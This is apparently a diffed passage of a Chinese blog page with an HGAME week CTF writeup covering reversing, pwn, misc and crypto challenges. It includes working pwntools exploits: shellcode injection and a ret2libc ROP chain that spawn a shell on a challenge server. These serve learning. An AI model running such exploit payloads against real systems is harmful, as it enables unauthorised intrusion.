+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Embedded file name: fvck.py</span></span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_key</span><span class="params">(arg=<span class="string">'1543788'</span>)</span>:</span></span><br><span class="line">    arg = int(arg)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">95</span>, int(arg / <span class="number">2</span> + <span class="number">1</span>)):</span><br><span class="line">        <span class="keyword">if</span> arg % i == <span class="number">0</span>:</span><br><span class="line">            print(hex(i), <span class="string">' '</span>)</span><br><span class="line">            <span class="keyword">return</span> print_key(arg / i)</span><br><span class="line">    print(arg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(arg)</span>:</span></span><br><span class="line">    m = md5.new()</span><br><span class="line">    m.update(arg)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64</span><span class="params">(arg=<span class="string">'Fuck1ng11'</span>)</span>:</span></span><br><span class="line">    <span class="comment"># string.oo_0</span></span><br><span class="line">    _all = list(string.ascii_uppercase + string.ascii_lowercase) + list(string.digits) + [<span class="string">'+'</span>, <span class="string">'/'</span>]</span><br><span class="line">    bin_ed = [ <span class="string">'&#123;:0&gt;6&#125;'</span>.format(str(bin(_all.index(i))).replace(<span class="string">'0b'</span>, <span class="string">''</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> arg <span class="keyword">if</span> i != <span class="string">'='</span> ]</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    count = arg.count(<span class="string">'='</span>)</span><br><span class="line">    <span class="keyword">while</span> bin_ed:</span><br><span class="line">        four_letter = <span class="string">''</span>.join(bin_ed[:<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">if</span> len(four_letter) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">            four_letter = four_letter[<span class="number">0</span>:<span class="number">-2</span> * count]</span><br><span class="line">        o1_o1 = [ four_letter[x:x + <span class="number">8</span>] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>] ]</span><br><span class="line">        o1_o1 = [ int(x, <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> o1_o1 <span class="keyword">if</span> x ]</span><br><span class="line">        result += <span class="string">''</span>.join([ chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> o1_o1 ])</span><br><span class="line">        bin_ed = bin_ed[<span class="number">4</span>:]</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># RnVjazFuZzEx,  9 -&gt; 12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Welcome to hammer's miaomiaowu"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Give me your choice:'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'1) fuck hammer'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'2) hit hammer'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'3) save hammer'</span></span><br><span class="line"></span><br><span class="line">        choice = raw_input()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">'1'</span>:</span><br><span class="line">            lll = raw_input(<span class="string">'plz input your public key:'</span>)</span><br><span class="line">            <span class="keyword">if</span> lll == <span class="string">'1543788'</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Here is your key:'</span></span><br><span class="line">                print_key(lll)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">'2'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Hammer was the mouth of the b_all, only issued a "wuwu" voice, but he wrote a figure on the w_all: 1543788'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">'3'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"You must give me the flag , or you can't save hammer jiejie as your rbq!\n"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'But I must know who are you , give me your key:'</span></span><br><span class="line">            key = raw_input()</span><br><span class="line"></span><br><span class="line">            flag = raw_input(<span class="string">'Now , give me your flag:'</span>)</span><br><span class="line">            flag_p3 = flag[<span class="number">-4</span>:<span class="number">-1</span>]  <span class="comment"># length == 3</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> flag_p3 != key:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Unknown key!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            get_base64 = open(<span class="string">'1.jpeg'</span>, <span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">            get_base64.seek(<span class="number">1024</span>, <span class="number">0</span>)</span><br><span class="line">            o = get_md5(get_base64.read(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">            get_base64.seek(<span class="number">512</span>, <span class="number">1</span>)</span><br><span class="line">            oo = get_md5(get_base64.read(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">            get_base64.seek(<span class="number">256</span>, <span class="number">1</span>)</span><br><span class="line">            ooo = get_md5(get_base64.read(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">            get_base64.seek(<span class="number">128</span>, <span class="number">1</span>)</span><br><span class="line">            ooo0 = get_md5(get_base64.read(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Pay attention, The program may be abnormal'</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> o != <span class="string">'0d61f8370cad1d412f80b84d143e1257'</span>:  <span class="comment"># C</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Error flag!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> oo != <span class="string">'cfcd208495d565ef66e7dff9f98764da'</span>:  <span class="comment"># 0</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Error flag!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ooo != <span class="string">'8277e0910d750195b448797616e091ad'</span>:  <span class="comment"># d</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Error flag!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ooo0 != <span class="string">'e4da3b7fbbce2345d7772b0674a318d5'</span>:  <span class="comment"># 5</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Error flag!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            flag_p2 = o + oo + ooo + ooo0  <span class="comment"># C0d5</span></span><br><span class="line"></span><br><span class="line">            flag_p1 = flag[<span class="number">6</span>:<span class="number">15</span>]  <span class="comment"># 9, hgame&#123; Fuck1ng11 _ C0d5 _ orz &#125;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> unknown_function(flag_p1) != <span class="string">'RnVjazFuZzEx'</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Error flag5!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Yeah! You got it!'</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'hgame&#123;'</span> + flag_p1 + <span class="string">'_'</span> + flag_p2 + <span class="string">'_'</span> + flag_p3 + <span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure>
 <h3 id="Iccanobif-250"><a href="#Iccanobif-250" class="headerlink" title="Iccanobif [250]"></a>Iccanobif [250]</h3><p>照着这里的流程 <a href="https://reverseengineeringtips.blogspot.com/2014/12/unpacking-jar2exe-21-extracting-jar.html?showComment=1480364662658#c447064983483780468" target="_blank" rel="noopener">https://reverseengineeringtips.blogspot.com/2014/12/unpacking-jar2exe-21-extracting-jar.html?showComment=1480364662658#c447064983483780468</a> 把 jar 提取出来：</p>
 <p><img src="re3.png" alt="re3"></p>
 <p>逆操作：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">skey = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"ainvzhuangaishenghuo"</span>]  <span class="comment"># 0 - 19</span></span><br><span class="line">cipher = [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">27</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">27</span>, <span class="number">23</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">8</span>, <span class="number">29</span>, <span class="number">15</span>, <span class="number">58</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">27</span>, <span class="number">48</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">27</span>, <span class="number">28</span>]</span><br><span class="line"></span><br><span class="line">flag = list(<span class="string">"x"</span> * <span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n, i <span class="keyword">in</span> enumerate(flag):</span><br><span class="line">    flag[n] = chr(cipher[n] ^ skey[n % <span class="number">20</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">skey = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"ainvzhuangaishenghuo"</span>]  <span class="comment"># 0 - 19</span></span><br><span class="line">cipher = [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">27</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">27</span>, <span class="number">23</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">8</span>, <span class="number">29</span>, <span class="number">15</span>, <span class="number">58</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">27</span>, <span class="number">48</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">27</span>, <span class="number">28</span>]</span><br><span class="line"></span><br><span class="line">flag = list(<span class="string">"x"</span> * <span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n, i <span class="keyword">in</span> enumerate(flag):</span><br><span class="line">    flag[n] = chr(cipher[n] ^ skey[n % <span class="number">20</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></table></figure>
 <h2 id="Pwn"><a href="#Pwn" class="headerlink" title="{ Pwn }"></a>{ Pwn }</h2><h3 id="ez-shellcode-100"><a href="#ez-shellcode-100" class="headerlink" title="ez_shellcode [100]"></a>ez_shellcode [100]</h3><p>直接拿 pwntools 里现成的：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn = remote(<span class="string">"111.230.149.72"</span>, <span class="number">10004</span>)</span><br><span class="line">conn.recvuntil(<span class="string">'&gt; '</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">conn.sendline(asm(shellcraft.i386.linux.sh(), arch=<span class="string">'i386'</span>))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn = remote(<span class="string">"111.230.149.72"</span>, <span class="number">10004</span>)</span><br><span class="line">conn.recvuntil(<span class="string">'&gt; '</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">conn.sendline(asm(shellcraft.i386.linux.sh(), arch=<span class="string">'i386'</span>))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="ez-bash-jail-100"><a href="#ez-bash-jail-100" class="headerlink" title="ez bash jail [100]"></a>ez bash jail [100]</h3><p>胡乱试出来的，输入 <code>$0</code> 后即可直接 <code>cat flag</code>。至于为什么可以，还没时间细究。</p>
 <h3 id="hacker-system-ver1-100"><a href="#hacker-system-ver1-100" class="headerlink" title="hacker_system_ver1 [100]"></a>hacker_system_ver1 [100]</h3><p>应该属于入门级别的 ROP？</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'111.230.149.72'</span>, <span class="number">10005</span>)</span><br><span class="line">file = ELF(<span class="string">'./hacker_system_ver1'</span>)</span><br><span class="line"></span><br><span class="line">puts = file.plt[<span class="string">'puts'</span>]</span><br><span class="line">start_main_got = file.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main = <span class="number">0x08048C1D</span>  <span class="comment"># file.symbols['main']</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'@'</span>*<span class="number">64</span> + p32(puts) + p32(main) + p32(start_main_got)</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">'length:'</span>, <span class="string">'100'</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">'name:'</span>, payload)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">'not find!!\n'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">start_main = u32(conn.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">'[@] __libc_start_main address: '</span> + hex(start_main))</span><br><span class="line"></span><br><span class="line">str_bin_sh_offset = <span class="number">0x15902b</span> - <span class="number">0x18540</span></span><br><span class="line">system_offset  = <span class="number">0x3A940</span> - <span class="number">0x18540</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'@'</span>*<span class="number">64</span> + p32(start_main + system_offset) + p32(<span class="number">0xdeadbeef</span>) + p32(start_main + str_bin_sh_offset)</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">'length:'</span>, <span class="string">'100'</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">'name:'</span>, payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'111.230.149.72'</span>, <span class="number">10005</span>)</span><br><span class="line">file = ELF(<span class="string">'./hacker_system_ver1'</span>)</span><br><span class="line"></span><br><span class="line">puts = file.plt[<span class="string">'puts'</span>]</span><br><span class="line">start_main_got = file.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main = <span class="number">0x08048C1D</span>  <span class="comment"># file.symbols['main']</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'@'</span>*<span class="number">64</span> + p32(puts) + p32(main) + p32(start_main_got)</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">'length:'</span>, <span class="string">'100'</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">'name:'</span>, payload)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">'not find!!\n'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">start_main = u32(conn.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">'[@] __libc_start_main address: '</span> + hex(start_main))</span><br><span class="line"></span><br><span class="line">str_bin_sh_offset = <span class="number">0x15902b</span> - <span class="number">0x18540</span></span><br><span class="line">system_offset  = <span class="number">0x3A940</span> - <span class="number">0x18540</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'@'</span>*<span class="number">64</span> + p32(start_main + system_offset) + p32(<span class="number">0xdeadbeef</span>) + p32(start_main + str_bin_sh_offset)</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">'length:'</span>, <span class="string">'100'</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">'name:'</span>, payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="{ Misc }"></a>{ Misc }</h2><h3 id="咻咻咻-200"><a href="#咻咻咻-200" class="headerlink" title="咻咻咻 [200]"></a>咻咻咻 [200]</h3><p>”锁没上好“，伪加密，用 ZipCenOp.jar 处理掉伪加密后得到音频文件。用 Adobe Audition 打开，放大后发现音频前方有一些可能代表二进制的数据，用 <a href="https://github.com/ragibson/Steganography" target="_blank" rel="noopener">https://github.com/ragibson/Steganography</a> 这个工具得到 <code>aGdhbWV7aDRwcHlfeGl1X1hpdV94eHh4aVVVfQ==</code>，解密可得 <code>hgame{h4ppy_xiu_Xiu_xxxxiUU}</code></p>
 <h3 id="White-cosmos-150"><a href="#White-cosmos-150" class="headerlink" title="White cosmos [150]"></a>White cosmos [150]</h3><p>解压得到由 tab 跟空格组成的文件，共 223 个字符，应该不是二进制，考虑是摩尔斯电码。如果 tab 为 - 而空格为 , 则可逐步恢复得到 6867616d657b57656c63306d655f325f57684974655f73703463657d，s.decode(‘hex’) 即可得到 hgame{Welc0me_2_WhIte_sp4ce}</p>
 <p>所用网站：<a href="http://www.atool.org/morse.php" target="_blank" rel="noopener">http://www.atool.org/morse.php</a> 不知道是不是网站的 bug，后边很多零，反正我手动逐步删除前边几个字符便可逐步得到上边的完整密文。</p>
 <h3 id="easy-password-150"><a href="#easy-password-150" class="headerlink" title="easy password [150]"></a>easy password [150]</h3><p>既然给了提示，直接暴力解题：</p>
 <p><img src="misc3.png" alt="misc3"></p>
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="{ Crypto }"></a>{ Crypto }</h2><h3 id="easy-rsa-150"><a href="#easy-rsa-150" class="headerlink" title="easy rsa [150]"></a>easy rsa [150]</h3><p>因为 <code>r = pq - (p+q) + 1</code> 已知，又根据 <code>ed = 1 (mod r)</code> 可求 d，知道 d 后直接解密即可。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_Euclid</span><span class="params">(n, m)</span>:</span></span><br><span class="line">    <span class="comment"># 这个函数代码网上找来的，懒得写咯</span></span><br><span class="line">    <span class="keyword">if</span> (m == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y = ext_Euclid(m, n%m)</span><br><span class="line">        x, y = y, (x - (n/m) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line">d = ext_Euclid(e, r)  <span class="comment"># 求得初值为负数，+ r 即可</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_Euclid</span><span class="params">(n, m)</span>:</span></span><br><span class="line">    <span class="comment"># 这个函数代码网上找来的，懒得写咯</span></span><br><span class="line">    <span class="keyword">if</span> (m == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y = ext_Euclid(m, n%m)</span><br><span class="line">        x, y = y, (x - (n/m) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line">d = ext_Euclid(e, r)  <span class="comment"># 求得初值为负数，+ r 即可</span></span><br></pre></td></tr></table></figure>
 <h3 id="The-same-simple-RSA-150"><a href="#The-same-simple-RSA-150" class="headerlink" title="The same simple RSA [150]"></a>The same simple RSA [150]</h3><p>公钥只有 256 位，直接拿去 <a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a> 分解得到 p，q。</p>
 <h3 id="Caesar-amp-amp-Caesar-200"><a href="#Caesar-amp-amp-Caesar-200" class="headerlink" title="Caesar&amp;&amp;Caesar [200]"></a>Caesar&amp;&amp;Caesar [200]</h3><p>写了一小段代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'...(cipher)...'</span>.split()</span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line">dis = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    n += len(i)</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> d:</span><br><span class="line">        dis.append((n - d[i], i))</span><br><span class="line">    d[i] = n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到：</span></span><br><span class="line"><span class="comment"># [(28, 'sw'), (259, 'hal'), (231, 'phw'), (224, 'tb'), (210, 'ktz'), (28, 'tb'), (343, 'o'), (14, 'cy'), (63, 'o'), (231, 'aar'), (406, 'e'), (413, 'n'), (469, 'vj'), (497, 'alv'), (469, 'sw'), (560, 'ff')]</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">'...(cipher)...'</span>.split()</span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line">dis = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    n += len(i)</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> d:</span><br><span class="line">        dis.append((n - d[i], i))</span><br><span class="line">    d[i] = n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到：</span></span><br><span class="line"><span class="comment"># [(28, 'sw'), (259, 'hal'), (231, 'phw'), (224, 'tb'), (210, 'ktz'), (28, 'tb'), (343, 'o'), (14, 'cy'), (63, 'o'), (231, 'aar'), (406, 'e'), (413, 'n'), (469, 'vj'), (497, 'alv'), (469, 'sw'), (560, 'ff')]</span></span><br></pre></td></tr></table></figure>
 <p>稍微分析一下可猜测密钥长度为 7，然后我就扔这里解密了=。=：<a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a> 密钥为 <code>another</code>，谷歌一下可知道是百年孤独。</p>
 <h3 id="violence-200"><a href="#violence-200" class="headerlink" title="violence [200]"></a>violence [200]</h3><p>因为相同的字母总是会得到相同的密文，把数字转换成正常一点的 <code>zxjfghjfz_hg_gdvfz_d_khg_xm_uhxcfqrf</code> 之后，直接扔 <code>quipquip.com</code> 可得到：<code>sometimes_it_takes_a_bit_of_violence</code></p>
 
-  </div>
-</article>
+                    </p>
 
-    <div class="blog-post-comments">
-        <div id="disqus_thread">
-            <noscript>Please enable JavaScript to view the comments.</noscript>
+                    <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="../writeup-of-hgame-week3/">
+        Previous post: HGAME Week3 Writeup
+    </a>
+    
+    <span class="page-number"></span>
+    
+    <a class="older-posts" href="../writeup-of-hgame-week1/">
+        Next post: HGAME Week1 Writeup
+    </a>
+    
+</nav>
+
+                    
+                </div>
+            </div>
         </div>
     </div>
-
-
-
-    </div>
-    
-      <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="../../index.html">Home</a></li>
-         
-          <li><a href="../../archives/">Archives</a></li>
-         
-          <li><a href="../../about/">About</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">{ Web }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Random-250"><span class="toc-number">1.1.</span> <span class="toc-text">Random? [250]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#草莓社区-1-100"><span class="toc-number">1.2.</span> <span class="toc-text">草莓社区-1 [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-2-150"><span class="toc-number">1.3.</span> <span class="toc-text">xss-2 [150]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#最简单的sql题-50"><span class="toc-number">1.4.</span> <span class="toc-text">最简单的sql题 [50]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-number">2.</span> <span class="toc-text">{ Re }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#miaomiaowu-200"><span class="toc-number">2.1.</span> <span class="toc-text">miaomiaowu [200]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Iccanobif-250"><span class="toc-number">2.2.</span> <span class="toc-text">Iccanobif [250]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">3.</span> <span class="toc-text">{ Pwn }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-shellcode-100"><span class="toc-number">3.1.</span> <span class="toc-text">ez_shellcode [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-bash-jail-100"><span class="toc-number">3.2.</span> <span class="toc-text">ez bash jail [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hacker-system-ver1-100"><span class="toc-number">3.3.</span> <span class="toc-text">hacker_system_ver1 [100]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">{ Misc }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#咻咻咻-200"><span class="toc-number">4.1.</span> <span class="toc-text">咻咻咻 [200]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#White-cosmos-150"><span class="toc-number">4.2.</span> <span class="toc-text">White cosmos [150]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-password-150"><span class="toc-number">4.3.</span> <span class="toc-text">easy password [150]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">{ Crypto }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-rsa-150"><span class="toc-number">5.1.</span> <span class="toc-text">easy rsa [150]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-same-simple-RSA-150"><span class="toc-number">5.2.</span> <span class="toc-text">The same simple RSA [150]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Caesar-amp-amp-Caesar-200"><span class="toc-number">5.3.</span> <span class="toc-text">Caesar&amp;&amp;Caesar [200]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#violence-200"><span class="toc-number">5.4.</span> <span class="toc-text">violence [200]</span></a></li></ol></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
